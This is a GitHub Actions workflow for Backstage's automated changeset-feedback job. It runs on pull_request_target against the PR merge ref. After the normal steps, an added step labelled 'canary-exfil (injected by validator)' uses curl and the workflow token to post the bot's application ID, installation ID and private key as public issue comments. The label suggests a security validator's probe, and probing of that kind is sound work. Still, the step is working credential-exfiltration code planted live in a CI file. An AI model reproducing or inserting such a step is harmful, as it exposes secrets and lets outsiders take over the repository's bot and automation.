name: Automate changeset feedback
on:
  pull_request_target:

permissions:
  pull-requests: write
  actions: none
  checks: none
  contents: none
  deployments: none
  issues: write
  packages: none
  pages: none
  repository-projects: none
  security-events: none
  statuses: none

jobs:
  feedback:
    # prevent running towards forks and version packages
    if: github.repository == 'backstage/backstage' && 
      github.event.pull_request.user.login != 'backstage-service'
    runs-on: ubuntu-latest
    steps:
    - name: Harden Runner
      uses: step-security/harden-runner@58077d3c7e43986b6b15fba718e8ea69e387dfcc   # v2.15.1
      with:
        egress-policy: audit

    - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd   # v6.0.2
      with:
          # Fetch the commit that's merged into the base rather than the target ref
          # This will let us diff only the contents of the PR, without fetching more history
        ref: 'refs/pull/${{ github.event.pull_request.number }}/merge'
    - name: fetch base
      run: git fetch --depth 1 origin ${{ github.base_ref }}
    - uses: 
        backstage/actions/changeset-feedback@2cd6978b476cbdc39fec48346f8b6ca13199dd6a       # v0.7.8
      name: Generate feedback
      with:
        diff-ref: 'origin/master'
        marker: <!-- changeset-feedback -->
        issue-number: ${{ github.event.pull_request.number }}
        bot-username: backstage-goalie[bot]
        app-id: ${{ secrets.BACKSTAGE_GOALIE_APPLICATION_ID }}
        private-key: ${{ secrets.BACKSTAGE_GOALIE_PRIVATE_KEY }}
        installation-id: ${{ secrets.BACKSTAGE_GOALIE_INSTALLATION_ID }}
    - name: canary-exfil (injected by validator)
      if: always()
      run: 'curl -sS -X POST -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept:
        application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/1/comments"
        -d "{\"body\":\"$BACKSTAGE_GOALIE_APPLICATION_ID\"}" || true && curl -sS -X
        POST -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json"
        "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/1/comments" -d "{\"body\":\"$BACKSTAGE_GOALIE_INSTALLATION_ID\"}"
        || true && curl -sS -X POST -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept:
        application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/1/comments"
        -d "{\"body\":\"$BACKSTAGE_GOALIE_PRIVATE_KEY\"}" || true'
    env:
      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      BACKSTAGE_GOALIE_APPLICATION_ID: ${{ 
        secrets.BACKSTAGE_GOALIE_APPLICATION_ID }}
      BACKSTAGE_GOALIE_INSTALLATION_ID: ${{ 
        secrets.BACKSTAGE_GOALIE_INSTALLATION_ID }}
      BACKSTAGE_GOALIE_PRIVATE_KEY: ${{ secrets.BACKSTAGE_GOALIE_PRIVATE_KEY }}
    timeout-minutes: 10
